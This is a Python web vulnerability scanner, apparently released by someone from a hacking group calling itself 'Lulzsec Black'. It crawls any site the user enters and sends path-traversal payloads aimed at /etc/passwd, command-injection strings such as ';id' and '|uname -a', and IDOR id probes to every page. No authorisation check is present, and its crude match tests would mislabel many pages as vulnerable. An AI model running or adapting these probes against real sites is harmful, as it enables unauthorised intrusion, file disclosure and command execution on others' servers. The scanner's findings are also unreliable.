import requests
from bs4 import BeautifulSoup
import pyfiglet  # استيراد مكتبة pyfiglet لعرض النص بأنماط ASCII مختلفة

# توليف عنوان "brup" بحجم 19 وبخط slant
title = pyfiglet.figlet_format("brup", font="slant", width=160)

# تلوين العنوان باللون الأحمر
colored_title = "\033[1;31;40m" + title + "\033[0;37;40m"

# عرض العنوان الملون
print(colored_title)

print("\033[1;32;40mDon't forget to follow my Instagram account ahu_orphan\033[0;37;40m")
print("\033[1;32;40mThis tool was made by orphan From a team Lulzsec Black\033[0;37;40m")
print("\033[1;32;40mLink to our team channel on Telegram: https://t.me/Luzsec_Black\033[0;37;40m")

# طلب إدخال رابط الموقع من المستخدم
base_url = input("\033[1;32;40m\nEnter the website URL (including http or https): \033[0;37;40m").strip()

# نتائج الفحص
results = []

# استخراج جميع الروابط من الصفحة
def get_all_links(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        links = set()
        for link in soup.find_all('a', href=True):
            href = link['href']
            if href.startswith('/'):
                links.add(base_url + href)
            elif href.startswith(base_url):
                links.add(href)
        return links
    except:
        return set()

# فحص IDOR
def check_idor(url):
    test_ids = ['1', '2', '3']
    for test_id in test_ids:
        test_url = f"{url}?id={test_id}"
        response = requests.get(test_url)
        if response.status_code == 200 and test_id in response.text:
            return True
    return False

# فحص Path Traversal
def check_path_traversal(url):
    test_paths = ['../etc/passwd', '../../etc/passwd', '../../../etc/passwd']
    for test_path in test_paths:
        test_url = f"{url}/{test_path}"
        response = requests.get(test_url)
        if response.status_code == 200 and 'root:' in response.text:
            return True
    return False

# فحص RCE
def check_rce(url):
    test_commands = [';id', '|id', '&id', ';uname -a', '|uname -a']
    for command in test_commands:
        test_url = f"{url}?cmd={command}"
        response = requests.get(test_url)
        if response.status_code == 200 and ('uid=' in response.text or 'Linux' in response.text):
            return True
    return False

# فحص جميع المسارات
def scan_all_paths(base_url):
    visited = set()
    to_visit = set(['/'])  # بدء الفحص من الصفحة الرئيسية
    
    while to_visit:
        current_path = to_visit.pop()
        full_url = base_url + current_path if current_path.startswith('/') else current_path

        if full_url in visited:
            continue

        visited.add(full_url)
        links = get_all_links(full_url)
        to_visit.update(links)

        result = {
            'url': full_url,
            'IDOR': check_idor(full_url),
            'Path Traversal': check_path_traversal(full_url),
            'RCE': check_rce(full_url)
        }
        results.append(result)

# البدء في الفحص
scan_all_paths(base_url)

# تنسيق النتائج في جدول
html_table = """
<html>
<head>
<style>
table { width: 100%; border-collapse: collapse; }
th, td { border: 1px solid black; padding: 8px; text-align: left; }
th { background-color: #f2f2f2; }
.green { background-color: green; }
.red { background-color: red; }
</style>
</head>
<body>
<h2>Vulnerability Scan Results</h2>
<table>
  <tr>
    <th>URL</th>
    <th>IDOR</th>
    <th>Path Traversal</th>
    <th>RCE</th>
  </tr>
"""

for result in results:
    idor_color = 'red' if result['IDOR'] else 'green'
    pt_color = 'red' if result['Path Traversal'] else 'green'
    rce_color = 'red' if result['RCE'] else 'green'
    html_table += f"""
    <tr>
      <td>{result['url']}</td>
      <td class="{idor_color}">{'Vulnerable' if result['IDOR'] else 'Not Vulnerable'}</td>
      <td class="{pt_color}">{'Vulnerable' if result['Path Traversal'] else 'Not Vulnerable'}</td>
      <td class="{rce_color}">{'Vulnerable' if result['RCE'] else 'Not Vulnerable'}</td>
    </tr>
    """

html_table += """
</table>
</body>
</html>
"""

# حفظ النتائج إلى ملف HTML
with open('scan_results.html', 'w') as f:
    f.write(html_table)

print("\n\033[1;36;40mScan completed successfully. Results saved in scan_results.html\033[0;37;40m")


